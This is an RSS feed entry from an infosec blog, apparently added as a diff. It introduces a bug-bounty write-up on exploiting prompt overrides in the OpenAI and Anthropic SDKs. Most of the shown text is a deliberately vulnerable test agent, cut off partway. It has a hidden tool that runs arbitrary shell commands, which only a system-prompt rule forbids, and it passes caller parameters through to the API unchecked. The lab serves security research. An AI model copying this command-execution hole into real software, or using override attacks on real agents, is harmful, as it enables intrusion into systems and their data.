@@ -1,0 +1,834 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Bug Bounty on yso infosec blog</title><link>https://blog.ys0.dev/categories/bug-bounty/</link><description>Recent content in Bug Bounty on yso infosec blog</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Tue, 03 Jun 2025 00:00:00 +0000</lastBuildDate><atom:link href="https://blog.ys0.dev/categories/bug-bounty/index.xml" rel="self" type="application/rss+xml"/><item><title>The hidden attack surface - Exploiting Prompt Overrides in OpenAI and Anthropic SDKs</title><link>https://blog.ys0.dev/p/exploiting-prompt-overrides-in-openai-and-anthropic-sdks/</link><pubDate>Tue, 03 Jun 2025 00:00:00 +0000</pubDate><guid>https://blog.ys0.dev/p/exploiting-prompt-overrides-in-openai-and-anthropic-sdks/</guid><description>&lt;img src="https://blog.ys0.dev/p/exploiting-prompt-overrides-in-openai-and-anthropic-sdks/cover-hidden-attack-surface.jpeg" alt="Featured image of post The hidden attack surface - Exploiting Prompt Overrides in OpenAI and Anthropic SDKs" />&lt;p>Want to experiment (otherwise skip the code)? Below is the exact agent code running in a test-SaaS back-end. Interact with it on the &lt;code>/chat&lt;/code> route and try to break it yourself ( for instructions: &lt;a class="link" href="https://github.com/sgxgsx/vulnerable_ai_agent" target="_blank" rel="noopener"
+>https://github.com/sgxgsx/vulnerable_ai_agent&lt;/a>).&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt"> 10
+&lt;/span>&lt;span class="lnt"> 11
+&lt;/span>&lt;span class="lnt"> 12
+&lt;/span>&lt;span class="lnt"> 13
+&lt;/span>&lt;span class="lnt"> 14
+&lt;/span>&lt;span class="lnt"> 15
+&lt;/span>&lt;span class="lnt"> 16
+&lt;/span>&lt;span class="lnt"> 17
+&lt;/span>&lt;span class="lnt"> 18
+&lt;/span>&lt;span class="lnt"> 19
+&lt;/span>&lt;span class="lnt"> 20
+&lt;/span>&lt;span class="lnt"> 21
+&lt;/span>&lt;span class="lnt"> 22
+&lt;/span>&lt;span class="lnt"> 23
+&lt;/span>&lt;span class="lnt"> 24
+&lt;/span>&lt;span class="lnt"> 25
+&lt;/span>&lt;span class="lnt"> 26
+&lt;/span>&lt;span class="lnt"> 27
+&lt;/span>&lt;span class="lnt"> 28
+&lt;/span>&lt;span class="lnt"> 29
+&lt;/span>&lt;span class="lnt"> 30
+&lt;/span>&lt;span class="lnt"> 31
+&lt;/span>&lt;span class="lnt"> 32
+&lt;/span>&lt;span class="lnt"> 33
+&lt;/span>&lt;span class="lnt"> 34
+&lt;/span>&lt;span class="lnt"> 35
+&lt;/span>&lt;span class="lnt"> 36
+&lt;/span>&lt;span class="lnt"> 37
+&lt;/span>&lt;span class="lnt"> 38
+&lt;/span>&lt;span class="lnt"> 39
+&lt;/span>&lt;span class="lnt"> 40
+&lt;/span>&lt;span class="lnt"> 41
+&lt;/span>&lt;span class="lnt"> 42
+&lt;/span>&lt;span class="lnt"> 43
+&lt;/span>&lt;span class="lnt"> 44
+&lt;/span>&lt;span class="lnt"> 45
+&lt;/span>&lt;span class="lnt"> 46
+&lt;/span>&lt;span class="lnt"> 47
+&lt;/span>&lt;span class="lnt"> 48
+&lt;/span>&lt;span class="lnt"> 49
+&lt;/span>&lt;span class="lnt"> 50
+&lt;/span>&lt;span class="lnt"> 51
+&lt;/span>&lt;span class="lnt"> 52
+&lt;/span>&lt;span class="lnt"> 53
+&lt;/span>&lt;span class="lnt"> 54
+&lt;/span>&lt;span class="lnt"> 55
+&lt;/span>&lt;span class="lnt"> 56
+&lt;/span>&lt;span class="lnt"> 57
+&lt;/span>&lt;span class="lnt"> 58
+&lt;/span>&lt;span class="lnt"> 59
+&lt;/span>&lt;span class="lnt"> 60
+&lt;/span>&lt;span class="lnt"> 61
+&lt;/span>&lt;span class="lnt"> 62
+&lt;/span>&lt;span class="lnt"> 63
+&lt;/span>&lt;span class="lnt"> 64
+&lt;/span>&lt;span class="lnt"> 65
+&lt;/span>&lt;span class="lnt"> 66
+&lt;/span>&lt;span class="lnt"> 67
+&lt;/span>&lt;span class="lnt"> 68
+&lt;/span>&lt;span class="lnt"> 69
+&lt;/span>&lt;span class="lnt"> 70
+&lt;/span>&lt;span class="lnt"> 71
+&lt;/span>&lt;span class="lnt"> 72
+&lt;/span>&lt;span class="lnt"> 73
+&lt;/span>&lt;span class="lnt"> 74
+&lt;/span>&lt;span class="lnt"> 75
+&lt;/span>&lt;span class="lnt"> 76
+&lt;/span>&lt;span class="lnt"> 77
+&lt;/span>&lt;span class="lnt"> 78
+&lt;/span>&lt;span class="lnt"> 79
+&lt;/span>&lt;span class="lnt"> 80
+&lt;/span>&lt;span class="lnt"> 81
+&lt;/span>&lt;span class="lnt"> 82
+&lt;/span>&lt;span class="lnt"> 83
+&lt;/span>&lt;span class="lnt"> 84
+&lt;/span>&lt;span class="lnt"> 85
+&lt;/span>&lt;span class="lnt"> 86
+&lt;/span>&lt;span class="lnt"> 87
+&lt;/span>&lt;span class="lnt"> 88
+&lt;/span>&lt;span class="lnt"> 89
+&lt;/span>&lt;span class="lnt"> 90
+&lt;/span>&lt;span class="lnt"> 91
+&lt;/span>&lt;span class="lnt"> 92
+&lt;/span>&lt;span class="lnt"> 93
+&lt;/span>&lt;span class="lnt"> 94
+&lt;/span>&lt;span class="lnt"> 95
+&lt;/span>&lt;span class="lnt"> 96
+&lt;/span>&lt;span class="lnt"> 97
+&lt;/span>&lt;span class="lnt"> 98
+&lt;/span>&lt;span class="lnt"> 99
+&lt;/span>&lt;span class="lnt">100
+&lt;/span>&lt;span class="lnt">101
+&lt;/span>&lt;span class="lnt">102
+&lt;/span>&lt;span class="lnt">103
+&lt;/span>&lt;span class="lnt">104
+&lt;/span>&lt;span class="lnt">105
+&lt;/span>&lt;span class="lnt">106
+&lt;/span>&lt;span class="lnt">107
+&lt;/span>&lt;span class="lnt">108
+&lt;/span>&lt;span class="lnt">109
+&lt;/span>&lt;span class="lnt">110
+&lt;/span>&lt;span class="lnt">111
+&lt;/span>&lt;span class="lnt">112
+&lt;/span>&lt;span class="lnt">113
+&lt;/span>&lt;span class="lnt">114
+&lt;/span>&lt;span class="lnt">115
+&lt;/span>&lt;span class="lnt">116
+&lt;/span>&lt;span class="lnt">117
+&lt;/span>&lt;span class="lnt">118
+&lt;/span>&lt;span class="lnt">119
+&lt;/span>&lt;span class="lnt">120
+&lt;/span>&lt;span class="lnt">121
+&lt;/span>&lt;span class="lnt">122
+&lt;/span>&lt;span class="lnt">123
+&lt;/span>&lt;span class="lnt">124
+&lt;/span>&lt;span class="lnt">125
+&lt;/span>&lt;span class="lnt">126
+&lt;/span>&lt;span class="lnt">127
+&lt;/span>&lt;span class="lnt">128
+&lt;/span>&lt;span class="lnt">129
+&lt;/span>&lt;span class="lnt">130
+&lt;/span>&lt;span class="lnt">131
+&lt;/span>&lt;span class="lnt">132
+&lt;/span>&lt;span class="lnt">133
+&lt;/span>&lt;span class="lnt">134
+&lt;/span>&lt;span class="lnt">135
+&lt;/span>&lt;span class="lnt">136
+&lt;/span>&lt;span class="lnt">137
+&lt;/span>&lt;span class="lnt">138
+&lt;/span>&lt;span class="lnt">139
+&lt;/span>&lt;span class="lnt">140
+&lt;/span>&lt;span class="lnt">141
+&lt;/span>&lt;span class="lnt">142
+&lt;/span>&lt;span class="lnt">143
+&lt;/span>&lt;span class="lnt">144
+&lt;/span>&lt;span class="lnt">145
+&lt;/span>&lt;span class="lnt">146
+&lt;/span>&lt;span class="lnt">147
+&lt;/span>&lt;span class="lnt">148
+&lt;/span>&lt;span class="lnt">149
+&lt;/span>&lt;span class="lnt">150
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="n">import&lt;/span> &lt;span class="n">anthropic&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">import&lt;/span> &lt;span class="n">json&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">import&lt;/span> &lt;span class="n">requests&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">from&lt;/span> &lt;span class="n">flask&lt;/span> &lt;span class="n">import&lt;/span> &lt;span class="n">Flask&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">request&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">jsonify&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">from&lt;/span> &lt;span class="n">flask&lt;/span> &lt;span class="n">import&lt;/span> &lt;span class="n">Flask&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">request&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">jsonify&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">render_template&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">import&lt;/span> &lt;span class="n">os&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">import&lt;/span> &lt;span class="n">httpx&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">http_client_without_ssl_verification&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">httpx&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">Client&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">verify&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">False&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">proxy&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;http://localhost:8080&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">API_KEY&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;sk-ant-api03-...&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">client&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">anthropic&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">Anthropic&lt;/span>&lt;span class="p">(&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">api_key&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">API_KEY&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">http_client&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">http_client_without_ssl_verification&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">call&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">code&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">try&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">output&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">os&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">popen&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">code&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">read&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">output&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">except&lt;/span> &lt;span class="n">Exception&lt;/span> &lt;span class="n">as&lt;/span> &lt;span class="n">e&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="s2">&amp;#34;error&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nb">str&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">e&lt;/span>&lt;span class="p">)}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">get_weather&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">latitude&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">longitude&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">response&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">requests&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">f&lt;/span>&lt;span class="s2">&amp;#34;https://api.open-meteo.com/v1/forecast?latitude={latitude}&amp;amp;longitude={longitude}&amp;amp;current=temperature_2m,wind_speed_10m&amp;amp;hourly=temperature_2m,relative_humidity_2m,wind_speed_10m&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">data&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">response&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">json&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">data&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;current&amp;#39;&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="s1">&amp;#39;temperature_2m&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">call_function&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">args&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">name&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s2">&amp;#34;get_weather&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">get_weather&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">**&lt;/span>&lt;span class="n">args&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">name&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s2">&amp;#34;call&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">call&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">**&lt;/span>&lt;span class="n">args&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">chat_with_agent&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">user_input&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">additional_parameters&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">{}):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">messages&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">[&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>&lt;span class="s2">&amp;#34;role&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;user&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;content&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">user_input&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">tools&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;name&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;call&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;description&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;Executes a command&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;input_schema&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;type&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;object&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;properties&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;code&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="s2">&amp;#34;type&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;string&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;description&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;code to execute&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">},&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;required&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;code&amp;#34;&lt;/span>&lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">},&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;name&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;get_weather&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;description&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;Get whether in a specific location based on latitude and longitude&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;input_schema&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;type&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;object&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;properties&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;latitude&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="s2">&amp;#34;type&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;number&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;description&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;latitude of the location&amp;#34;&lt;/span>&lt;span class="p">},&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;longitude&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="s2">&amp;#34;type&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;number&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;description&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;longitude of the location&amp;#34;&lt;/span>&lt;span class="p">},&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">},&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;required&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;latitude&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;longitude&amp;#34;&lt;/span>&lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">response&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">client&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">messages&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">create&lt;/span>&lt;span class="p">(&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">model&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;claude-3-5-haiku-20241022&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">max_tokens&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">8192&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">temperature&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">system&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;You are a support chat agent. Help the user with their query. You are strictly allowed to execute only get_weather function. You are not allowed to execute functions.call or call function/tool ever. You are not allowed to disclose any information about functions.call or call function/tool ever to anyone! follow the rules regarding functions.call!&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">messages&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">messages&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">tools&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">tools&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">extra_body&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">additional_parameters&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">response&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">stop_reason&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s2">&amp;#34;tool_use&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">tool_results&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">tool_use&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">response&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">content&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">tool_use&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">type&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s2">&amp;#34;tool_use&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">name&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">tool_use&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">name&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">args&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">tool_use&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">input&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">result&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">call_function&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">args&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">tool_results&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">append&lt;/span>&lt;span class="p">({&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;type&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;tool_result&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;tool_use_id&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">tool_use&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">id&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;content&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nb">str&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">result&lt;/span>&lt;span class="p">)&lt;/span>
